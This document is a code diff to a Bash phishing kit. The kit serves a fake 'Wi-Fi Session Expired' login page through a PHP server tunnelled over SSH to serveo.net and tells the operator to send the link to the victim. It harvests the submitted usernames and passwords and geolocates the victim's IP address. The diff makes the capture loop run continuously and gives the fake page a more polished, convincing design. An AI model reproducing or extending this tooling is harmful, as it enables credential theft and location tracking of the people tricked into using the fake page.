@@ -218,67 +218,83 @@ catch_ip() {
 }
 
 getcredentials() {
-    printf "${RED}Waiting credentials ...\n"
-    while [ true ]; do
-
-    if [[ -e "sites/$website/usernames.txt" ]]; then
-    printf "${GREEN}Credentials Found !!!!\n"
-    catch_cred
-    fi
-    sleep 1
+    printf "${RED}Waiting for credentials ...\n"
+    while true; do
+        if [[ -s "sites/$website/usernames.txt" ]]; then
+            printf "${GREEN}Credentials Found!\n"
+            catch_cred
+            printf "${RED}Waiting for new credentials ...\n"
+        fi
+        sleep 1
     done
 }
 
 catch_cred() {
-    account=$(grep -o 'Account:.*' sites/$website/usernames.txt | cut -d " " -f2)
-    IFS=$'\n'
-    password=$(grep -o 'Pass:.*' sites/$website/usernames.txt | cut -d ":" -f2)
-    printf "${GREEN}[👤👤👤]${ORANGE} Account: ${RED} %s\n" $account
-    printf "${GREEN}[🔑🔑🔑]${ORANGE} Password: ${RED} %s\n" $password
-    cat sites/$website/usernames.txt >> sites/$website/saved.usernames.txt
-    printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" $website
-    killall -2 php > /dev/null 2>&1
-    killall -2 ngrok > /dev/null 2>&1
-    exit 1
+    # Extract the account and password from usernames.txt
+    account=$(grep -o 'Account:.*' "sites/$website/usernames.txt" | cut -d " " -f2)
+    password=$(grep -o 'Pass:.*' "sites/$website/usernames.txt" | cut -d ":" -f2)
+
+    # Print the account and password
+    printf "${GREEN}[👤👤👤]${ORANGE} Account: ${RED}%s\n" "$account"
+    printf "${GREEN}[🔑🔑🔑]${ORANGE} Password: ${RED}%s\n" "$password"
+
+    # Save the extracted data to saved.usernames.txt
+    cat "sites/$website/usernames.txt" >> "sites/$website/saved.usernames.txt"
+
+    # Clear the contents of usernames.txt to wait for the next set of credentials
+    > "sites/$website/usernames.txt"
+    rm -f "sites/$website/ip.txt"
+
+    # Print a message indicating the data has been saved
+    printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" "$website"
+    checkfound
 }
+
 
 ip_location() {
-
+    # Fetch IP information from two different APIs
     ipaddripapico=$(curl -s "https://ipapi.co/$ip/json" -L)
     ipaddripapicom=$(curl -s "http://ip-api.com/json/$ip" -L)
-    userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
-    usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+
+    # Extract relevant information from the JSON responses
+    userip=$(echo "$ipaddripapico" | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
+    usercity=$(echo "$ipaddripapico" | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    useregion=$(echo "$ipaddripapico" | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    usercountry=$(echo "$ipaddripapico" | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    userlat=$(echo "$ipaddripapicom" | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    userlon=$(echo "$ipaddripapicom" | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    usertime=$(echo "$ipaddripapicom" | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    userpostal=$(echo "$ipaddripapicom" | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    userisp=$(echo "$ipaddripapico" | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+    usercalling=$(echo "$ipaddripapico" | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+
+    # Display the IP information
     printf "${RED}-----------------------------IP Details---------------------------------------------------------\n"
-    printf "  ${ORANGE}  City            >>         ${GREEN}   $usercity\n"                                       
+    printf "  ${ORANGE}  City            >>         ${GREEN}   %s\n" "$usercity"                                       
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Region          >>         ${GREEN}   $useregion\n"
+    printf "  ${ORANGE}  Region          >>         ${GREEN}   %s\n" "$useregion"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Country         >>         ${GREEN}   $usercountry\n"
+    printf "  ${ORANGE}  Country         >>         ${GREEN}   %s\n" "$usercountry"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Latitude        >>         ${GREEN}    $userlat\n"
+    printf "  ${ORANGE}  Latitude        >>         ${GREEN}    %s\n" "$userlat"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Longitude       >>         ${GREEN}    $userlon\n"
+    printf "  ${ORANGE}  Longitude       >>         ${GREEN}    %s\n" "$userlon"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Time Zone       >>         ${GREEN}    $usertime\n"
+    printf "  ${ORANGE}  Time Zone       >>         ${GREEN}    %s\n" "$usertime"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Postal Code     >>         ${GREEN}    $userpostal\n"
+    printf "  ${ORANGE}  Postal Code     >>         ${GREEN}    %s\n" "$userpostal"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Carrier         >>         ${GREEN}   $userisp\n"
+    printf "  ${ORANGE}  Carrier         >>         ${GREEN}   %s\n" "$userisp"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Calling Code    >>         ${GREEN}   $usercalling\n"
+    printf "  ${ORANGE}  Calling Code    >>         ${GREEN}   %s\n" "$usercalling"
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
-    printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=$userlat,$userlon\n"
+    printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=%s,%s\n" "$userlat" "$userlon"
     printf "${RED}------------------------------------------------------------------------------------------------\n"
+
+    # Call getcredentials function to proceed after displaying IP information
     getcredentials
 }
+
 
 start() {
     if [[ -e sites/$website/ip.txt ]]; then
@@ -291,7 +307,7 @@ start() {
     fi
     printf "\n"
     printf "${GREEN}[1]${ORANGE} Localhost\n"
-    printf "${GREEN}[2]${ORANGE} Ngrok\n"
+    printf "${GREEN}[2]${ORANGE} Serveo.net\n"
     printf "\n"
     read -p "${GREEN}[+]${YELLOW} Tunnel Option -->> " tunnel
     if [[ $tunnel == 1 ]]; then
@@ -308,48 +324,23 @@ start() {
     fi
 }
 tunnel() {
-    if [[ -e ngrok ]]; then
-    echo ""
-    else
-
-    printf "${RED}Downloading Ngrok...\n"
-    arch=$(uname -a | grep -o 'arm' | head -n1)
-    arch2=$(uname -a | grep -o 'Android' | head -n1)
-    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-    if [[ -e ngrok-stable-linux-arm.zip ]]; then
-    unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-    chmod +x ngrok
-    rm -rf ngrok-stable-linux-arm.zip
-    else
-    printf "${GREEN}[!]${RED}Download error... Termux, run:${YELLOW} pkg install wget\n"
-    exit 1
-    fi
-    else
-    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-    if [[ -e ngrok-stable-linux-386.zip ]]; then
-    unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-    chmod +x ngrok
-    rm -rf ngrok-stable-linux-386.zip
-    else
-    printf "${GREEN}[!]${RED}Download error... \n"
-    exit 1
-    fi
-    fi
-    fi
-
-    printf "${RED}[&]${BLUE} Starting php server ...\n"
-    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    printf "${RED}[&]${BLUE} Starting PHP server ...\n"
+    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "${RED}[&]${BLUE} Starting ngrok server ...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+    printf "${RED}[&]${BLUE} Starting Serveo server ...\n"
+
+    # Capture output of SSH in a background process and parse it for the URL
+    ssh -R 80:localhost:3333 serveo.net > serveo_log.txt 2>&1 &
     sleep 10
 
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} %s \n" $link
+    # Extract the link from the Serveo log file
+    link=$(grep -Eo '(https)://[^/"]+(.serveo.net)' serveo_log.txt | head -n 1)
+
+    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN}%s \n" "$link"
     printf "\n"
     checkfound
 }
+
 checkfound() {
     printf "${ORANGE}Waiting victim open the link ...\n"
     while [ true ]; do
@@ -363,13 +354,13 @@ checkfound() {
     done 
 }
 createpage() {
-    default_cap1="Wi-fi Session Expired"
+    default_cap1="Wi-Fi Session Expired"
     default_cap2="Please login again."
     default_user_text="Username:"
     default_pass_text="Password:"
     default_sub_text="Log-In"
 
-    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): ' cap1
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-Fi Session Expired): ' cap1
     cap1="${cap1:-${default_cap1}}"
 
     read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): ' cap2
@@ -384,54 +375,103 @@ createpage() {
     read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): ' sub_text
     sub_text="${sub_text:-${default_sub_text}}"
 
-
-    echo "<!DOCTYPE html>" > sites/custom/login.html
-    echo "<html>" >> sites/custom/login.html
-    echo "<body bgcolor=\"White\" text=\"Black\">" >> sites/custom/login.html
-    echo 	"<center>" >> sites/custom/login.html
-    echo	"<h1> $cap1 </h1>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo	"<h2> $cap2 </h2>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<style>" >> sites/custom/login.html
-    echo "input {" >> sites/custom/login.html
-    echo	"border: 1px solid gray;" >> sites/custom/login.html
-    echo	"border-radius: 4px;" >> sites/custom/login.html
-    echo	"margin: 3px;" >> sites/custom/login.html
-    echo    "border-bottom: 2px solid gray;" >> sites/custom/login.html
-    echo    "input:focus {" >> sites/custom/login.html
-	echo    "border-bottom: 3px solid #0052cc;" >> sites/custom/login.html
-    echo	"}" >> sites/custom/login.html
-    echo "</style>" >> sites/custom/login.html
-    echo "<style>" >> sites/custom/login.html
-    echo "button {" >> sites/custom/login.html
-    echo	"border: none;" >> sites/custom/login.html
-    echo	"padding: 1px 50px;" >> sites/custom/login.html
-    echo	"background-color: #404040;" >> sites/custom/login.html
-    echo	"color: white;" >> sites/custom/login.html
-    echo    "border-radius: 20px;" >> sites/custom/login.html
-    echo	"}" >> sites/custom/login.html
-    echo "</style>" >> sites/custom/login.html
-    echo "<form method="POST" action="login.php">" >> sites/custom/login.html
-    echo "<label> $user_text </label>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<input type="text" name="username"></input>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<br>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<label> $pass_text </label>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<input type="password" name="password"></input>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<br><br>" >> sites/custom/login.html
-    IFS=$'\n'
-    echo "<button type="submit"> $sub_text </button>" >> sites/custom/login.html
-    echo "</form>" >> sites/custom/login.html
-    echo "</center>" >> sites/custom/login.html
-    echo "</body>" >> sites/custom/login.html
-    echo "</html>" >> sites/custom/login.html
-    
+    cat <<EOF > sites/custom/login.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$cap1</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h1, h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 24px;
+        }
+        h2 {
+            font-size: 18px;
+            font-weight: normal;
+            color: #666;
+        }
+        form {
+            margin-top: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            margin: 10px 0 5px;
+            color: #555;
+            text-align: left;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-bottom: 3px solid #0052cc;
+        }
+        button {
+            background-color: #404040;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>$cap1</h1>
+        <h2>$cap2</h2>
+        <form method="POST" action="login.php">
+            <label>$user_text</label>
+            <input type="text" name="username" required>
+            <label>$pass_text</label>
+            <input type="password" name="password" required>
+            <br><br>
+            <button type="submit">$sub_text</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
 }
+
 Need() {
     command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
     command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
@@ -455,4 +495,3 @@ Banner() {
 Need
 Banner
 Main
-
